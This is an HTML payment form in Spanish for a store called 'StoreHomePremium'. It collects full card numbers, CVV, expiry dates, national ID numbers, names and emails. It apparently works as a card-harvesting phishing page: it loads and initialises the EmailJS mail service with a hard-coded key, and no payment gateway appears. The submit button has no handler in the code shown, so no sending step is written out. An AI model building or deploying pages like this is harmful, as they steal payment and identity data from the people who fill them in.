<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>StoreHomePremium</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f2f4f7;
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      color: #1f2933;
      padding: 24px;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
      display: flex;
      flex-direction: column;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
      text-align: center;
      color: #0a2f7a;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 18px;
    }

    label {
      margin-top: 12px;
      font-size: 13px;
      font-weight: 600;
      color: #374151;
    }

    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #cbd5e1;
      margin-top: 6px;
      font-size: 14px;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: #0a2f7a;
    }

    /* ===== TARJETA VISUAL ===== */

    .card-visual {
      background: linear-gradient(145deg, #0f172a, #1e293b);
      border-radius: 16px;
      padding: 20px;
      margin-top: 22px;
      color: white;
      box-shadow: 0 12px 25px rgba(0,0,0,0.4);
      transition: all 0.3s ease;
    }

    .card-visual.active {
      transform: translateY(-6px) scale(1.02);
      box-shadow: 0 20px 45px rgba(0,0,0,0.55);
    }

    .card-brands {
      display: flex;
      gap: 12px;
      margin-bottom: 18px;
    }

    .card-brands span {
      background: rgba(255,255,255,0.12);
      padding: 6px 14px;
      border-radius: 8px;
      font-size: 14px;
      opacity: 0.4;
      transition: opacity 0.3s;
    }

    .card-brands span.active {
      opacity: 1;
    }

    .card-number {
      font-size: 20px;
      letter-spacing: 3px;
      margin-bottom: 18px;
    }

    .card-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 18px;
    }

    .card-exp,
    .card-cvv {
      background: rgba(255,255,255,0.08);
      padding: 10px;
      border-radius: 8px;
      width: 45%;
      text-align: center;
    }

    .card-name {
      font-size: 14px;
      text-transform: uppercase;
      opacity: 0.85;
    }

    button {
      margin-top: 22px;
      width: 100%;
      padding: 13px;
      border: none;
      border-radius: 10px;
      background: #0a2f7a;
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #08245f;
    }
  </style>
</head>

<body>

<div class="card">

  <h1>StoreHomePremium<br>– pago seguro y simple</h1>

  <p class="subtitle">
    Seleccione el monto a pagar y complete el formulario con sus datos.
  </p>

  <label>Monto a pagar</label>
  <input id="monto" type="number" placeholder="$ Ingrese monto en pesos">

  <label>Nombre completo</label>
  <input id="nombre" type="text" placeholder="Ej: Carlos Pérez">

  <label>Email</label>
  <input id="email" type="email" placeholder="correo@gmail.com.ar">

  <label>DNI</label>
  <input id="dni" type="number" placeholder="DNI">

  <label>Nombre del titular</label>
  <input id="titular" type="text" placeholder="Nombre tal como aparece en la tarjeta">

  <label>Número de tarjeta</label>
  <input id="numero_tarjeta" type="text"
         inputmode="numeric"
         autocomplete="cc-number"
         placeholder="1234 5678 9012 3456">

  <label>Fecha de expiración (MM/AA)</label>
  <input id="fecha_expiracion" type="text" inputmode="numeric" placeholder="MM/AA">

  <label>Código de seguridad (CVV)</label>
  <input id="codigo_seguridad" type="text" inputmode="numeric" placeholder="123">

  <!-- TARJETA VISUAL -->
  <div class="card-visual" id="cardVisual">

    <div class="card-brands">
      <span id="brand-visa">VISA</span>
      <span id="brand-master">MASTERCARD</span>
    </div>

    <div class="card-number" id="preview-number">
      **** **** **** 1234
    </div>

    <div class="card-row">
      <div class="card-exp" id="preview-exp">MM / AA</div>
      <div class="card-cvv">***</div>
    </div>

    <div class="card-name" id="preview-name">
      NOMBRE DEL TITULAR
    </div>

  </div>

  <button type="button" id="enviar">Ver opciones de cuotas</button>

</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
  emailjs.init("gOD19I3u7jPioagR4");

  const cardVisual = document.getElementById("cardVisual");
  const visa = document.getElementById("brand-visa");
  const master = document.getElementById("brand-master");

  document.querySelectorAll("input").forEach(input => {
    input.addEventListener("focus", () => cardVisual.classList.add("active"));
    input.addEventListener("blur", () => cardVisual.classList.remove("active"));
  });

  document.getElementById("titular").addEventListener("input", function () {
    document.getElementById("preview-name").textContent =
      this.value || "NOMBRE DEL TITULAR";
  });

  const inputTarjeta = document.getElementById("numero_tarjeta");
  inputTarjeta.addEventListener("input", function () {
    let value = this.value.replace(/\D/g, "").substring(0, 16);
    this.value = value.replace(/(.{4})/g, "$1 ").trim();

    document.getElementById("preview-number").textContent =
      "**** **** **** " + (value.slice(-4) || "1234");

    visa.classList.remove("active");
    master.classList.remove("active");

    if (value.startsWith("4")) visa.classList.add("active");

    const firstTwo = parseInt(value.substring(0,2));
    const firstFour = parseInt(value.substring(0,4));

    if (
      (firstTwo >= 51 && firstTwo <= 55) ||
      (firstFour >= 2221 && firstFour <= 2720)
    ) {
      master.classList.add("active");
    }
  });

  const inputFecha = document.getElementById("fecha_expiracion");
  inputFecha.addEventListener("input", function () {
    let value = this.value.replace(/\D/g, "").substring(0, 4);
    if (value.length > 2) value = value.slice(0,2) + "/" + value.slice(2);
    this.value = value;
    document.getElementById("preview-exp").textContent = value || "MM / AA";
  });

  document.getElementById("codigo_seguridad").addEventListener("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 3);
  });
</script>

</body>
</html>
